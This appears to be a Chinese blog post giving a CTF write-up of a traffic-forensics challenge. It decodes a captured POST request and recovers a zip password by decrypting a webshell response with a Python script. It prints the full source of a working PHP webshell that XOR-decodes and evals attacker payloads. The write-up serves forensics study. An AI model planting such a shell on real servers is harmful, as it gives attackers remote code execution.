+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="easy-traffic"><a href="#easy-traffic" class="headerlink" title="easy_traffic"></a>easy_traffic</h2><p>首先筛选http流量</p>
+<p><img src="https://gitee.com/bobrocket/img/raw/master/image-20260329145940199.png" srcset="/img/loading.gif" lazyload alt="image-20260329145940199"></p>
+<p>我们发现两个POST流量</p>
+<p>第一个上传了1.zip，我们追踪tcp把压缩包保存，发现里面有flag.png但是需要密码解压</p>
+<p>我们看第二个POST</p>
+<p><img src="https://gitee.com/bobrocket/img/raw/master/image-20260329150112668.png" srcset="/img/loading.gif" lazyload alt="image-20260329150112668"></p>
+<p>请求包的部分url解码，反转，base64解码得到一串代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php">@<span class="hljs-title function_ invoke__">session_start</span>();<br>@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$D</span>,<span class="hljs-variable">$K</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$D</span>);<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$K</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>        <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$D</span>;<br>&#125;<br><span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;camellia&#x27;</span>;<br><span class="hljs-variable">$payloadName</span>=<span class="hljs-string">&#x27;payload&#x27;</span>;<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;d2514888c140c3b6&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$pass</span>]))&#123;<br>    <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$pass</span>]),<span class="hljs-variable">$key</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]))&#123;<br>        <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>],<span class="hljs-variable">$key</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)===<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>		<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$payload</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$key</span>),<span class="hljs-number">0</span>,<span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">encode</span>(@<span class="hljs-title function_ invoke__">run</span>(<span class="hljs-variable">$data</span>),<span class="hljs-variable">$key</span>));<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$key</span>),<span class="hljs-number">16</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$data</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>我们用Python脚本解密响应包</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> gzip<br><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-comment"># 从响应中提取的数据</span><br>response = <span class="hljs-string">&quot;b467b82236edb9d3Lb45NDg4OGMxPvtN/Sz8zXj8e2XY3Tpj2fG+Kz9iNmQ=6d3a211d4d306f47&quot;</span><br><br><span class="hljs-comment"># 分割各部分</span><br>prefix = response[:<span class="hljs-number">16</span>]<br>b64_data = response[<span class="hljs-number">16</span>:-<span class="hljs-number">16</span>]<br>suffix = response[-<span class="hljs-number">16</span>:]<br><br><span class="hljs-comment"># 验证 MD5</span><br>pass_key = <span class="hljs-string">&quot;camellia&quot;</span> + <span class="hljs-string">&quot;d2514888c140c3b6&quot;</span><br>md5_hash = hashlib.md5(pass_key.encode()).hexdigest()<br><span class="hljs-keyword">assert</span> prefix == md5_hash[:<span class="hljs-number">16</span>]<br><span class="hljs-keyword">assert</span> suffix == md5_hash[<span class="hljs-number">16</span>:]<br><br><span class="hljs-comment"># Base64 解码</span><br>encrypted = base64.b64decode(b64_data)<br><br><span class="hljs-comment"># XOR 解密</span><br>key = <span class="hljs-string">&quot;d2514888c140c3b6&quot;</span><br>decrypted = <span class="hljs-built_in">bytearray</span>()<br><span class="hljs-keyword">for</span> i, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(encrypted):<br>    k = <span class="hljs-built_in">ord</span>(key[(i + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">15</span>])<br>    decrypted.append(b ^ k)<br><br><span class="hljs-comment"># Gzip 解压</span><br>password = gzip.decompress(<span class="hljs-built_in">bytes</span>(decrypted))<br><span class="hljs-built_in">print</span>(password)  <span class="hljs-comment"># b&#x27;kskblzdjd&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>得到kskblzdjd</p>
+<p>这个就是压缩包的密码，我们得到了flag.png</p>
+<p><img src="https://gitee.com/bobrocket/img/raw/master/flag.png" srcset="/img/loading.gif" lazyload alt="flag"></p>
+<p>这个是汉信码，我们找一个在线网站</p>
+<p><img src="https://gitee.com/bobrocket/img/raw/master/image-20260329150857859.png" srcset="/img/loading.gif" lazyload alt="image-20260329150857859"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>SDPCSEC纳新赛3.0</div>
+      <div>https://www.sunynov.top/2026/03/28/SDPCSEC纳新赛3/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>suny</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年3月28日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/03/29/PolarisCTF/" title="PolarisCTF">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">PolarisCTF</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/03/26/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD2026/" title="数字中国暨第六届“红明谷”初赛">
+                        <span class="hidden-mobile">数字中国暨第六届“红明谷”初赛</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"sg2xM2g9UCt39D62pmfzcl8b-gzGzoHsz","appKey":"ludHhVlixZUIrJv11t6rmegp","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":true,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":true},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://icp.gov.moe/?keyword=20250279" target="_blank">萌ICP备20250279号</a> <br> <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
